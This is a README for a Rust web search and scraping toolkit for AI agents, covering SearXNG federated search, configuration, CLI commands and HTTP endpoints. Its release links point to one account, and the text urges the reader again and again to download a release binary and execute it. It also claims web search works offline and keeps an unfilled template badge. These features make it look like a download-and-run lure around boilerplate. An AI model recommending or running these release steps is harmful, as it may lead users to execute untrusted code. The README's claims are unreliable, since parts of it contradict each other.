# Search-Scrape — Rust Web Search & Scrape Toolkit for AI Agents

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/ttthyjy/search-scrape/releases)  
https://github.com/ttthyjy/search-scrape/releases

![Rust logo](https://www.rust-lang.org/logos/rust-logo-512x512.png) ![Search icon](https://upload.wikimedia.org/wikipedia/commons/thumb/5/59/Magnifying_glass_icon.svg/240px-Magnifying_glass_icon.svg.png)

Overview
- Search-Scrape delivers a Rust-native toolset for web search and scraping.
- It targets AI assistants and agents that need live web signals.
- It uses federated search via SearXNG backends to avoid vendor lock.
- It runs without API keys and works offline once built.

Why use this toolkit
- Rust gives speed and safety for network and HTML work.
- The toolset avoids commercial search APIs.
- You can run search and scrape pipelines locally or on server nodes.
- You can combine multiple search engines and parse results with modular scrapers.

Key features
- Federated search via SearXNG engines and aggregator pools.
- Pluggable scrapers for HTML, JSON, and JS-rendered pages.
- Command-line interface and library crate for integration.
- Rate-limiting and concurrency controls per target host.
- Built-in parsers for microdata, Open Graph, JSON-LD, and schema.org.
- Headless-playwright bridge for heavy JS sites (optional module).
- Output formats: JSON Lines, CSV, and structured JSON for LLMs.

Architecture diagram
- Client (CLI or library) -> Search layer (SearXNG) -> Result filter -> Scrapers -> Parsers -> Output
- The tool splits search and fetch phases. Search returns result lists. Fetch extracts content and metadata.

Badges
- Build status: !(use your CI badge here)
- Releases: [Download releases](https://github.com/ttthyjy/search-scrape/releases)  
  (download the release asset from the releases page and execute it)

Quick start — download a release and run
1. Open the releases page: https://github.com/ttthyjy/search-scrape/releases  
2. Download the platform binary or archive. The release assets follow this pattern:
   - search-scrape-vX.Y.Z-x86_64-unknown-linux-gnu.tar.gz
   - search-scrape-vX.Y.Z-x86_64-apple-darwin.tar.gz
   - search-scrape-vX.Y.Z-windows-x86_64.zip
3. Example commands for Linux/macOS (replace vX.Y.Z with the real version):

   curl -L -o search-scrape.tar.gz \
     https://github.com/ttthyjy/search-scrape/releases/download/vX.Y.Z/search-scrape-vX.Y.Z-x86_64-unknown-linux-gnu.tar.gz

   tar -xzf search-scrape.tar.gz
   chmod +x search-scrape
   ./search-scrape --help

The release asset you download must be executed. The binary contains the CLI and the small builtin server for integrations.

Build from source
- Requirements: Rust toolchain (stable), cargo, openssl dev libs for some TLS backends.
- Steps:

   git clone https://github.com/ttthyjy/search-scrape.git
   cd search-scrape
   cargo build --release
   ./target/release/search-scrape --help

- The crate exports a library crate (search_scrape) you can add to other Rust projects.

Configuration
- Main config file format: YAML or JSON.
- Fields:
  - searx_backends: list of SearXNG endpoints (url, priority, timeout)
  - user_agent: string used for fetchers
  - rate_limits: per-host request rate
  - concurrency: global worker count
  - scrape_rules: extraction rules per domain
  - output: format and destination

Sample config (YAML)
searx_backends:
  - url: "https://searx.example.org"
    priority: 10
    timeout: 8
user_agent: "search-scrape/1.0 (+https://github.com/ttthyjy/search-scrape)"
rate_limits:
  default_per_host: 2
concurrency:
  workers: 8
scrape_rules:
  - domain: "example.com"
    selectors:
      title: "head > title"
      main: "article"

CLI basics
- Search mode:

   ./search-scrape search "open source LLM benchmarks" \
     --engine searx --backend https://searx.example.org \
     --pages 2 \
     --output results.jsonl

- Scrape a single URL:

   ./search-scrape fetch "https://example.com/article/123" \
     --extract title,author,main \
     --output article.json

- Run as a small HTTP service for agents:

   ./search-scrape serve --port 8080 --config config.yaml

API endpoints (when run as server)
- POST /search
  - body: { "q": "...", "engine": "searx", "pages": 2 }
  - returns: JSON list of results
- POST /fetch
  - body: { "url": "...", "rules": {...} }
  - returns: extracted fields and raw HTML
- POST /batch
  - handlers for bulk jobs with job id and status polling

Federated search via SearXNG
- The tool queries one or more SearXNG instances.
- It merges results and applies dedup filters.
- You can add private SearXNG instances or public pools.
- Use the searx_backends array in the config to add endpoints.
- Example backend entry:

  - url: "https://searxng.example.net"
    priority: 20
    api_key: null
    timeout: 6

Scrapers and parsers
- HTML scraper
  - CSS selectors and XPath
  - Schema.org and JSON-LD extraction
- JSON API scraper
  - Query-based field mapping
- Playwright bridge
  - Start a headless browser worker
  - Use when server-side JS changes the DOM
- Media downloader
  - Save images and other assets with optional size filters

Rate limiting and politeness
- The tool uses respect for robots.txt when enabled in config.
- It supports per-host delay and global concurrency.
- You control headers and user agent.

Output formats
- JSON Lines (recommended for pipelines)
- Structured JSON for LLM consumption
- CSV for tabular exports
- Custom output hooks via plugins

Plugin system
- Add custom scrapers as Rust dynamic modules or use script-based hooks.
- Plugins expose a small trait and register via the config.
- Example plugin types:
  - post_fetch processors
  - custom extractors
  - export adapters

Examples and use cases
- Live web context for chat agents
  - Query remote sources and return top-k passages
- Research snapshot
  - Run search + fetch, save structured results for later analysis
- Data collection
  - Harvest niche domains with site-specific rules
- Monitoring
  - Track changes on target pages and send webhooks

Security and credentials
- The tool does not require API keys for searches.
- You can configure secret stores for private backends.
- TLS uses the system certificate store.

Testing and CI
- The repo includes test suites for parsers and scrapers.
- Run tests with cargo test.
- Use integration tests for HTTP endpoints. You can mock SearXNG responses.

Integrations
- Use the library crate inside a Rust agent pipeline.
- Run the server and call its HTTP API from other languages.
- Connect output to a message queue or an LLM ingestion service.

Contributing
- Follow the repo style guide for code and docs.
- Open issues for feature requests and bug reports.
- Send pull requests for fixes and modules.

License and attribution
- The project uses a permissive open license. Check LICENSE file for details.
- It reuses open-source components. See third_party_licenses.md for credits.

Assets and images
- Rust logo: https://www.rust-lang.org/logos/rust-logo-512x512.png
- Search icon: https://upload.wikimedia.org/wikipedia/commons/thumb/5/59/Magnifying_glass_icon.svg/240px-Magnifying_glass_icon.svg.png
- SearXNG logo (useful for docs): https://raw.githubusercontent.com/searxng/searxng/master/searx/static/themes/default/img/searx-logo.png

Releases and downloads
- Visit the releases page to pick the correct asset and platform: https://github.com/ttthyjy/search-scrape/releases  
- Download the matching binary or archive and run the binary on your host. The release asset contains the executable and minimal config examples.

Contact and support
- Open issues on GitHub for bugs or feature requests.
- Propose pull requests for fixes and new scrapers.

CHANGELOG
- See the Releases page and the changelog file in the repo for version notes and breaking changes.

FAQ
- How do I add a private SearXNG instance?
  - Add it to searx_backends with URL and priority.
- How do I increase throughput?
  - Tune concurrency.workers and rate_limits in the config.
- How do I handle JS-only sites?
  - Enable the Playwright bridge module and increase timeout.

License file, changelog, and release assets live in the repo. Get the executable from the releases page and run the binary you downloaded: https://github.com/ttthyjy/search-scrape/releases

